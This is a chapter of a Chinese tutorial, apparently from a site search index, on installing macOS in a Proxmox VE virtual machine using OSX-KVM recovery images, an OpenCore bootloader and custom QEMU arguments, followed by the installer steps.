<p>\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u7528\u4e8e\u200b\u5728\u7ebf\u200b\u5b89\u88c5\u200b macOS \u200b\u7684\u200b\u539f\u7248\u200b\u955c\u50cf\u200b\uff0c\u200b\u4f18\u70b9\u200b\u662f\u200b\u7eaf\u51c0\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u200b\u7f51\u901f\u200b\u6bd4\u8f83\u200b\u5dee\u200b\u7684\u200b\u7f51\u53cb\u200b\u4e0d\u662f\u200b\u5f88\u200b\u53cb\u597d\u200b\u3002</p> <p>\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u5730\u5740\u200b\uff1ahttps://github.com/thenickdude/OSX-KVM</p> <p>\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u81ea\u5df1\u200b\u624b\u52a8\u200b\u7f16\u8bd1\u200b\u751f\u6210\u200b Monterey-recovery.img \u200b\u6062\u590d\u200b\u955c\u50cf\u200b\uff0c\u200b\u4f7f\u7528\u200b Linux \u200b\u6216\u8005\u200b macOS \u200b\u76f4\u63a5\u200b make \u200b\u7f16\u8bd1\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code># \u200b\u62c9\u53d6\u200b\u9879\u76ee\u200b\ngit clone https://github.com/thenickdude/OSX-KVM.git\n\n## Linux \u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u7f16\u8bd1\u200b\u76f8\u5173\u200b\u5de5\u5177\u200b\nsudo apt install qemu-utils make\n\n# \u200b\u7f16\u8bd1\u200b macOS 12 \u200b\u6062\u590d\u200b\u955c\u50cf\u200b\ncd scripts/monterey\nmake Monterey-recovery.img\n\n## \u200b\u5982\u679c\u200b\u4f60\u200b\u7f51\u901f\u200b\u5f88\u5feb\u200b\u7684\u8bdd\u200b \u200b\u76f4\u63a5\u200b\u6784\u5efa\u200b\u5b8c\u6574\u7248\u200b\u955c\u50cf\u200b\u4e5f\u200b\u662f\u200b OK \u200b\u7684\u200b (\u200b\u53ef\u200b\u9009\u200b\u64cd\u4f5c\u200b)\nmake Monterey-full.img\n\n# \u200b\u7f16\u8bd1\u200b macOS 13 \u200b\u6062\u590d\u200b\u955c\u50cf\u200b\ncd scripts/ventura\nmake Ventura-recovery.img\n\n## \u200b\u5982\u679c\u200b\u4f60\u200b\u7f51\u901f\u200b\u5f88\u5feb\u200b\u7684\u8bdd\u200b \u200b\u76f4\u63a5\u200b\u6784\u5efa\u200b\u5b8c\u6574\u7248\u200b\u955c\u50cf\u200b\u4e5f\u200b\u662f\u200b OK \u200b\u7684\u200b (\u200b\u53ef\u200b\u9009\u200b\u64cd\u4f5c\u200b)\nmake make Ventura-full.img\n</code></pre> <p>\u200b\u6700\u540e\u200b\u4e0a\u4f20\u200b\u7f16\u8bd1\u200b\u597d\u200b\u7684\u200b img \u200b\u5230\u200b PVE \u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u5e93\u200b\u5373\u53ef\u200b</p> <ul> <li>\u200b\u4f20\u7edf\u200b\u955c\u50cf\u200b</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u9ed1\u200b\u82f9\u679c\u200b\u804c\u4e1a\u200b\u73a9\u5bb6\u200b\u6765\u8bf4\u200b\uff0c\u200b\u51fa\u6765\u200b\u5de5\u4f5c\u200b\u968f\u8eab\u5e26\u200b\u4e2a\u200b \u201c\u200b\u9524\u5b50\u200b\u201d \u200b\u662f\u200b\u5f88\u200b\u6b63\u5e38\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5927\u5bb6\u200b\u57fa\u672c\u4e0a\u200b\u90fd\u200b\u662f\u200b\u6709\u200b\u9ed1\u200b\u82f9\u679c\u200b\u955c\u50cf\u200b\u7684\u200b\uff08\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u4e5f\u200b\u5f88\u591a\u200b\u4eba\u200b\u5206\u4eab\u200b\u5b8c\u6574\u200b\u955c\u50cf\u200b\uff09\uff0c\u200b\u4e0d\u8fc7\u200b\u5462\u200b\u6211\u4eec\u200b\u7684\u200b\u955c\u50cf\u200b\u662f\u200b dmg \u200b\u683c\u5f0f\u200b\u7684\u200b\u540e\u7f00\u200b\uff0cPVE \u200b\u5e76\u200b\u4e0d\u200b\u652f\u6301\u200b dmg \u200b\u540e\u7f00\u200b\u7684\u200b\u955c\u50cf\u200b\u4e0a\u4f20\u200b\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u76f4\u63a5\u200b\u5c06\u200b\u955c\u50cf\u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b iso \u200b\u5373\u53ef\u200b\uff0c\u200b\u5bf9\u200b\uff0c\u200b\u5c31\u662f\u200b\u8fd9\u4e48\u200b\u7b80\u5355\u200b\uff0c\u200b\u751a\u81f3\u200b\u90fd\u200b\u4e0d\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b dmg2img \u200b\u8fd9\u79cd\u200b\u5de5\u5177\u200b\uff0c\u200b\u6700\u540e\u200b\u4e0a\u4f20\u200b iso \u200b\u5230\u200b PVE \u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u5e93\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"7/1/#_2","title":"\u51c6\u5907\u200b\u5f15\u5bfc","text":"<p>PVE \u200b\u9ed1\u200b\u82f9\u679c\u200b OpenCore \u200b\u5f15\u5bfc\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u5730\u5740\u200b\uff1ahttps://github.com/thenickdude/KVM-Opencore/releases</p> <p>\u200b\u76f4\u63a5\u200b\u4e0b\u8f7d\u200b\u89e3\u538b\u200b\u7136\u540e\u200b\u4e0a\u200b\u4f20\u5230\u200b PVE \u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u5e93\u200b\u5373\u53ef\u200b\u3002</p> <p> </p>"},{"location":"7/1/#_3","title":"\u5e95\u5c42\u200b\u8bbe\u7f6e","text":"<p>\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u9700\u8981\u200b\u53c2\u8003\u200b\u524d\u9762\u200b\u7684\u200b\u6559\u7a0b\u200b\u90e8\u5206\u200b\u914d\u7f6e\u200b\u597d\u200b BIOS\uff1ahttps://pve.sqlsec.com/2/1/</p> <p>\u200b\u7136\u540e\u200b\u914d\u7f6e\u200b\u597d\u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b\u90e8\u5206\u200b\uff1ahttps://pve.sqlsec.com/2/3/ </p>"},{"location":"7/1/#_4","title":"\u865a\u62df\u673a\u200b\u914d\u7f6e","text":"<p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u865a\u62df\u673a\u200b\u914d\u7f6e\u200b\u7684\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\uff0c\u200b\u5927\u5bb6\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u6765\u200b\u53c2\u8003\u200b\uff1a</p> \u200b\u5e38\u89c4\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7cfb\u7edf\u200b\u78c1\u76d8\u200bCPU\u200b\u5185\u5b58\u200b\u7f51\u7edc\u200b <p></p> <p>\u200b\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u81ea\u5b9a\u4e49\u200b\u540d\u79f0\u200b\uff0c\u200b\u8bb0\u4f4f\u200b\u6b64\u65f6\u200b\u7684\u200b VM ID \u200b\u4e3a\u200b 103\uff0c\u200b\u540e\u9762\u200b\u9700\u8981\u200b\u7528\u200b\u5f97\u5230\u200b\u3002</p> <p>  \u200b\u5148\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b OpenCore \u200b\u7684\u200b\u5f15\u5bfc\u200b\u955c\u50cf\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u7c7b\u522b\u200b\u9009\u62e9\u200b\u300cOther\u300d\u3002</p> <p>  \u200b\u663e\u5361\u200b\u9009\u62e9\u200b\u300cVMWare \u200b\u517c\u5bb9\u200b\u300d\uff0c\u200b\u5f00\u542f\u200b Qemu \u200b\u4ee3\u7406\u200b\uff0cBIOS \u200b\u9009\u62e9\u200b\u300cQVMF UEFI\u300d\uff0c\u200b\u673a\u5668\u200b\u9009\u62e9\u200b\u300cq35\u300d,\u200b\u6700\u540e\u200b\u5fc5\u987b\u200b\u53d6\u6d88\u200b\u52fe\u9009\u200b\u300c\u200b\u9884\u200b\u6ce8\u518c\u200b\u5bc6\u94a5\u200b\u300d</p> <p></p> <p>\u200b\u786c\u76d8\u200b\u9009\u62e9\u200b\u300cVirtIO Block\u300d\uff0c\u200b\u7136\u540e\u200b\u78c1\u76d8\u200b\u5927\u5c0f\u200b\u6839\u636e\u200b\u4f60\u200b\u7684\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u7f13\u5b58\u200b\u9009\u62e9\u200b\u300cWrite back\uff08\u200b\u4e0d\u200b\u5b89\u5168\u200b\uff09\u300d\uff0c\u200b\u7136\u540e\u200b\u52fe\u9009\u200b\u300c\u200b\u4e22\u5f03\u200b\u300d\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u82f9\u679c\u200b\u7684\u200b TRIM \u200b\u6280\u672f\u200b\uff0c\u200b\u5176\u4ed6\u200b\u53c2\u8003\u200b\u56fe\u4e0a\u200b\u7ec6\u8282\u200b\u8bbe\u7f6e\u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u63d0\u200b\u4e00\u4e0b\u200b\uff1aSATA \u200b\u7c7b\u578b\u200b\u517c\u5bb9\u6027\u200b\u6700\u597d\u200b\uff0c\u200b\u4f46\u662f\u200b 4k \u200b\u8bfb\u5199\u200b\u901f\u5ea6\u200b\u4e0b\u964d\u200b\u5f88\u591a\u5f88\u591a\u200b\uff1bVirtIO Block \u200b\u662f\u200b\u9ed1\u200b\u82f9\u679c\u200b\u4e0b\u200b\u6700\u5feb\u200b\u7684\u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f46\u662f\u200b\u517c\u5bb9\u6027\u200b\u5dee\u4e00\u70b9\u200b\uff0c\u200b\u6bd4\u5982\u200b QQ \u200b\u95ea\u9000\u200b\u65e0\u6cd5\u200b\u6253\u5f00\u200b\u3002 \u200b\u6240\u4ee5\u200b\u9c7c\u200b\u548c\u200b\u718a\u638c\u200b\u4e0d\u53ef\u200b\u517c\u5f97\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u7814\u7a76\u200b\u4e86\u200b\u5f88\u200b\u4e45\u200b\u90fd\u200b\u6ca1\u6709\u200b\u627e\u5230\u200b\u5b8c\u7f8e\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u3002</p> <p>  CPU \u200b\u8bbe\u7f6e\u200b\u597d\u200b\u6838\u5fc3\u200b\u6570\u200b\uff08\u200b\u5efa\u8bae\u200b 2\u30014\u30018\uff09\uff0c\u200b\u7c7b\u522b\u200b\u9009\u62e9\u200b\u300cHaswell\u300d\u200b\u517c\u5bb9\u6027\u200b\u66f4\u597d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u77e5\u9053\u200b\u6211\u200b\u8fd9\u4e2a\u200b CPU \u200b\u4e5f\u200b\u662f\u200b\u5b8c\u5168\u200b\u6ca1\u200b\u53ef\u4ee5\u200b\u9ed1\u200b\u82f9\u679c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u76f4\u63a5\u200b\u9009\u62e9\u200b\u4e86\u200b\u300chost\u300d\u200b\u7c7b\u578b\u200b\u3002\u200b\u63a5\u7740\u200b\u52fe\u9009\u200b\u300c\u200b\u542f\u7528\u200b NUMA\u300d\u3002</p> <p>  \u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u914d\u7f6e\u200b\u5206\u914d\u5185\u5b58\u200b\uff0cmacOS \u200b\u7684\u8bdd\u200b\u5efa\u8bae\u200b\u81f3\u5c11\u200b\u5206\u914d\u200b 8GB \u200b\u5185\u5b58\u200b\uff0c\u200b\u7136\u540e\u200b\u53d6\u6d88\u200b\u52fe\u9009\u200b\u300cBallooning \u200b\u8bbe\u5907\u200b\u300d</p> <p>  \u200b\u7f51\u7edc\u200b\u7c7b\u578b\u200b\u9009\u62e9\u200b\u300cVirtIO \u200b\u534a\u200b\u865a\u62df\u5316\u200b\u300d\u200b\u6027\u80fd\u200b\u66f4\u597d\u200b\uff0c\u200b\u7136\u540e\u200b\u7f51\u6865\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u7f51\u53e3\u200b\u60c5\u51b5\u200b\u81ea\u884c\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u521b\u5efa\u200b\u5b8c\u200b\u865a\u62df\u673a\u200b\u540e\u5148\u200b\u4e0d\u8981\u200b\u7740\u6025\u200b\u5f00\u673a\u200b\uff0c\u200b\u6211\u4eec\u200b\u518d\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u6211\u4eec\u200b\u7684\u200b\u4e4b\u524d\u200b\u4e0a\u4f20\u200b\u597d\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u955c\u50cf\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5b8c\u6574\u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a  </p> <p> </p> <p>\u200b\u81f3\u4e8e\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0a\u200b\u56fe\u5708\u200b\u51fa\u6765\u200b\u7684\u200b\u662f\u200b\u4e24\u4e2a\u200b\u786c\u76d8\u200b\u800c\u200b\u4e0d\u662f\u200b\u4e24\u4e2a\u200b CD \u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0b\u200b\u4e00\u8282\u200b\u64cd\u4f5c\u200b\u4fee\u6539\u200b\u751f\u6548\u200b\u7684\u200b\uff0c\u200b\u5177\u4f53\u200b\u53c2\u8003\u200b\u4e0b\u200b\u4e00\u8282\u200b\u5373\u53ef\u200b\u3002 </p>"},{"location":"7/2/","title":"\u4fee\u6b63\u200b\u914d\u7f6e","text":""},{"location":"7/2/#_1","title":"\u53c2\u6570\u200b\u4fee\u6b63","text":"<p>\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b macOS \u200b\u7684\u200b\u865a\u62df\u673a\u200b\u7684\u200b ID \u200b\u4e3a\u200b 103\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8fd9\u4e2a\u200b ID \u200b\u76f4\u63a5\u200b\u6765\u200b\u7f16\u8f91\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u914d\u7f6e\u200b\uff08 Web \u200b\u754c\u9762\u200b\u529f\u80fd\u200b\u6709\u9650\u200b\uff0c\u200b\u76f4\u63a5\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u200b\u53ef\u4ee5\u200b\u66f4\u200b\u7075\u6d3b\u200b\u5b9a\u5236\u200b\uff09\uff1a</p> Bash<pre><code>nano /etc/pve/qemu-server/103.conf \n</code></pre> <p>\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b CPU \u200b\u7c7b\u522b\u200b\uff0c\u200b\u5728\u200b\u7b2c\u200b 1 \u200b\u884c\u200b\u6dfb\u52a0\u200b\u5982\u4e0b\u200b\u914d\u7f6e\u200b\uff1a</p>"},{"location":"7/2/#macos-13x","title":"macOS \uff1c 13.X","text":"<ul> <li>intel CPU</li> </ul> INI<pre><code>args: -device isa-applesmc,osk=\"ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc\" -smbios type=2 -device usb-kbd,bus=ehci.0,port=2 -cpu host,kvm=on,vendor=GenuineIntel,+kvm_pv_unhalt,+kvm_pv_eoi,+hypervisor,+invtsc\n</code></pre> <ul> <li>AMD CPU</li> </ul> INI<pre><code>args: -device isa-applesmc,osk=\"ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc\" -smbios type=2 -device usb-kbd,bus=ehci.0,port=2 -cpu Penryn,kvm=on,vendor=GenuineIntel,+kvm_pv_unhalt,+kvm_pv_eoi,+hypervisor,+invtsc,+pcid,+ssse3,+sse4.2,+popcnt,+avx,+avx2,+aes,+fma,+fma4,+bmi1,+bmi2,+xsave,+xsaveopt,check\n</code></pre>"},{"location":"7/2/#macos-13x-ventura","title":"macOS = 13.X Ventura","text":"<p>\u200b\u5982\u679c\u200b\u60a8\u200b\u7684\u200b CPU \u200b\u4e0d\u200b\u652f\u6301\u200b\uff0c\u200b\u6216\u8005\u200b\u60a8\u200b\u5e0c\u671b\u200b\u80fd\u591f\u200b\u5728\u200b Proxmox \u200b\u8282\u70b9\u200b\u4e4b\u95f4\u200b\u8fc1\u79fb\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b VM\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u4ece\u200b -cpu \u200b\u5217\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b\u201c+invtsc\u201d\u200b\u529f\u80fd\u200b\u3002</p> <ul> <li>intel CPU</li> </ul> INI<pre><code>args: -device isa-applesmc,osk=\"THE-OSK-YOU-EXTRACTED-GOES-HERE\" -smbios type=2 -device usb-kbd,bus=ehci.0,port=2 -global nec-usb-xhci.msi=off -global ICH9-LPC.acpi-pci-hotplug-with-bridge-support=off -cpu host,vendor=GenuineIntel,+invtsc,+hypervisor,kvm=on,vmware-cpuid-freq=on\n</code></pre> <ul> <li>AMD CPU</li> </ul> INI<pre><code>args: -device isa-applesmc,osk=\"ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc\" -smbios type=2 -device usb-kbd,bus=ehci.0,port=2 -global nec-usb-xhci.msi=off -global ICH9-LPC.acpi-pci-hotplug-with-bridge-support=off -cpu Haswell-noTSX,vendor=GenuineIntel,+invtsc,+hypervisor,kvm=on,vmware-cpuid-freq=on\n</code></pre>"},{"location":"7/2/#cd","title":"\u4fee\u6539\u200b CD \u200b\u5149\u76d8","text":"<p>\u200b\u63a5\u7740\u200b\u4fee\u6539\u200b\u6211\u4eec\u200b\u7684\u200b CD \u200b\u5149\u76d8\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5220\u6389\u200b\u300cmedia=cdrom\u300d\u200b\u6362\u6210\u200b\u300ccache=unsafe\u300d\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u914d\u7f6e\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"7/3/","title":"\u7cfb\u7edf\u200b\u5b89\u88c5","text":""},{"location":"7/3/#_1","title":"\u5f15\u5bfc\u200b\u8bbe\u7f6e","text":"<p>\u200b\u53d6\u6d88\u200b net \u200b\u8bbe\u5907\u200b\u5f15\u5bfc\u200b\uff0c\u200b\u5c06\u200b OpenCore \u200b\u5f15\u5bfc\u200b\u8c03\u6574\u200b\u81f3\u200b\u7b2c\u4e00\u4f4d\u200b\uff1a</p> <p> </p>"},{"location":"7/3/#_2","title":"\u7cfb\u7edf\u200b\u5b89\u88c5","text":"<p>\u200b\u7cfb\u7edf\u200b\u5b89\u88c5\u200b\u5bf9\u4e8e\u200b\u9ed1\u200b\u82f9\u679c\u200b\u73a9\u5bb6\u200b\u6765\u8bf4\u200b\u5e76\u200b\u4e0d\u96be\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b PVE \u200b\u7528\u6237\u200b\u5168\u4f53\u200b\u53ef\u80fd\u200b\u5bf9\u200b\u9ed1\u200b\u82f9\u679c\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u4e86\u89e3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u5c31\u200b\u518d\u200b\u8d58\u8ff0\u200b\u5570\u55e6\u200b\u4e00\u4e0b\u200b\u3002</p>"},{"location":"7/3/#1","title":"\u7b2c\u200b 1 \u200b\u904d\u200b\u8fdb\u5ea6\u6761","text":"<p>\u200b\u9996\u5148\u200b\u8fdb\u5165\u200b OpenCore \u200b\u754c\u9762\u200b\u7684\u200b\u4e3b\u200b\u754c\u9762\u200b\u5982\u4e0b\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u7684\u200b EFI \u200b\u662f\u200b\u9488\u5bf9\u200b PVE \u200b\u5b9a\u5236\u200b\u597d\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u76f4\u63a5\u200b\u9009\u62e9\u200b Install macOS Monterey \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u7b49\u5f85\u200b\u8fdb\u5165\u200b\u6761\u8d70\u200b\u5b8c\u200b\u8fdb\u5165\u200b\u5230\u200b\u82f9\u679c\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5b89\u88c5\u200b\u754c\u9762\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u78c1\u76d8\u5de5\u5177\u200b\uff1a</p> <p> </p> <p>\u200b\u6839\u636e\u200b\u4e0b\u56fe\u200b\u6807\u8bb0\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u5148\u200b\u9009\u62e9\u200b\u78c1\u76d8\u200b\uff0c\u200b\u7136\u540e\u200b\u64e6\u9664\u200b\u4e00\u4e0b\u200b\u5c31\u884c\u200b\uff0c\u200b\u683c\u5f0f\u200b\u4fdd\u6301\u200b\u9ed8\u8ba4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u81ea\u5b9a\u4e49\u200b 1 \u200b\u4e2a\u200b\u903c\u771f\u200b\u7684\u200b\u78c1\u76d8\u200b\u540d\u79f0\u200b\uff1aMacintosh</p> <p> </p> <p>\u200b\u64cd\u4f5c\u200b\u5b8c\u540e\u200b\uff0c\u200b\u70b9\u51fb\u200b\u300cErase\u300d\u200b\u5373\u53ef\u200b\u64e6\u9664\u200b\u78c1\u76d8\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u5b8c\u6210\u200b\u540e\u200b\u5173\u6389\u200b\u5f53\u524d\u200b\u7a97\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u7b2c\u4e8c\u9879\u200b\u300cInstall macOS Monterey\u300d\uff1a</p> <p> </p> <p>\u200b\u540e\u9762\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u6839\u636e\u200b\u7cfb\u7edf\u200b\u63d0\u793a\u200b\u8d70\u200b\u5373\u53ef\u200b\uff0c\u200b\u7b49\u5f85\u200b\u7b2c\u200b 1 \u200b\u904d\u200b\u8fdb\u5ea6\u6761\u200b\u5b89\u88c5\u200b\uff1a</p> <p> </p>"},{"location":"7/3/#2","title":"\u7b2c\u200b 2 \u200b\u904d\u200b\u8fdb\u5ea6\u6761","text":"<p>\u200b\u8fdb\u5ea6\u6761\u200b\u8d70\u200b\u5b8c\u540e\u200b\u81ea\u52a8\u200b\u91cd\u542f\u200b\uff0c\u200b\u6b64\u65f6\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u300cmacOS Installer\u300d\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u540e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5f00\u59cb\u200b\u8d70\u200b\u7b2c\u200b 2 \u200b\u904d\u200b\u8fdb\u5ea6\u6761\u200b\uff1a</p> <p> </p> <p>\u200b\u540e\u9762\u200b\u53ef\u80fd\u200b\u8fd8\u4f1a\u200b\u7ee7\u7eed\u200b\u91cd\u542f\u200b\u51e0\u6b21\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ea\u8981\u200b\u6709\u200b \u300cmacOS Installer\u300d\u200b\u9009\u9879\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6211\u4eec\u200b\u65e0\u8111\u200b\u7ee7\u7eed\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"7/3/#3","title":"\u7b2c\u200b 3 \u200b\u904d\u200b\u8fdb\u5ea6\u6761","text":"<p>\u200b\u6b64\u65f6\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u78c1\u76d8\u200b\u540d\u79f0\u200b Macintosh \u200b\u7684\u200b\u9009\u9879\u200b\uff0c\u200b\u9009\u62e9\u200b\u4ed6\u200b\uff1a</p> <p> </p> <p>\u200b\u53ef\u80fd\u200b\u8fd8\u4f1a\u200b\u7ee7\u7eed\u200b\u91cd\u542f\u200b\u51e0\u6b21\u200b\uff0c\u200b\u6700\u7ec8\u200b\u6211\u4eec\u200b\u8fdb\u5165\u200b\u5230\u200b\u4e86\u200b  macOS \u200b\u521d\u59cb\u5316\u200b\u754c\u9762\u200b\uff1a</p> <p> </p>"},{"location":"7/3/#_3","title":"\u521d\u59cb\u5316\u200b\u7cfb\u7edf","text":"<p>\u200b\u8be6\u7ec6\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u6559\u7a0b\u200b\uff1a\u200b\u5b9e\u6218\u200b\u6f14\u793a\u200b - \u200b\u521d\u59cb\u5316\u200b\u8bbe\u7f6e\u200b</p> <p>\u200b\u9009\u62e9\u200b\u597d\u200b\u81ea\u5df1\u200b\u7684\u200b\u56fd\u5bb6\u200b\u5730\u533a\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u70b9\u51fb\u200b\u300c\u200b\u7ee7\u7eed\u200b\u300d\uff0c\u200b\u540e\u9762\u200b\u5927\u5bb6\u200b\u6839\u636e\u200b\u7cfb\u7edf\u200b\u5f15\u5bfc\u200b\u6765\u200b\u64cd\u4f5c\u200b\u5c31\u884c\u200b\uff0c\u200b\u53cd\u6b63\u200b\u4e00\u76f4\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u611f\u89c9\u200b\u70b9\u51fb\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff0c\u200b\u6b63\u5e38\u4eba\u200b\u90fd\u200b\u6ca1\u200b\u95ee\u9898\u200b\u7684\u200b\uff0c\u200b\u6700\u540e\u200b\u6211\u4eec\u200b\u4f1a\u200b\u6210\u529f\u200b\u8fdb\u5165\u200b\u82f9\u679c\u200b\u7cfb\u7edf\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u662f\u200b\u6ca1\u6709\u200b\u663e\u5361\u200b\u9a71\u52a8\u200b\u7684\u200b\uff0c\u200b\u6211\u4eec\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u5f88\u200b\u5361\u200b\uff0c\u200b\u53e6\u5916\u200b\u8fd8\u6709\u200b\u5f88\u591a\u200b\u7ec6\u8282\u200b\u9700\u8981\u200b\u4f18\u5316\u200b\uff0c\u200b\u6240\u4ee5\u200b\u63a5\u7740\u200b\u770b\u200b\u4e0b\u200b\u4e00\u7ae0\u200b\u5427\u200b\uff0c\u200b\u6211\u4eec\u200b\u79bb\u200b\u6210\u529f\u200b\u4e0d\u8fdc\u200b\u4e86\u200b\u3002</p>"},{"location":"7/4/","title":"\u7cfb\u7edf\u4f18\u5316","text":""},{"location":"7/4/#_1","title":"\u7247\u8a00\u200b\u788e\u8bed","text":"<p>\u200b\u56fd\u5149\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u6559\u7a0b\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u9ed1\u200b\u82f9\u679c\u200b\u53c8\u200b\u662f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u9886\u57df\u200b\u7684\u200b\u77e5\u8bc6\u70b9\u200b\u4e86\u200b\uff0c\u200b\u800c\u4e14\u200b\u77e5\u8bc6\u70b9\u200b\u6709\u70b9\u200b\u7e41\u6742\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0d\u200b\u9002\u5408\u200b\u5728\u200b\u672c\u200b PVE 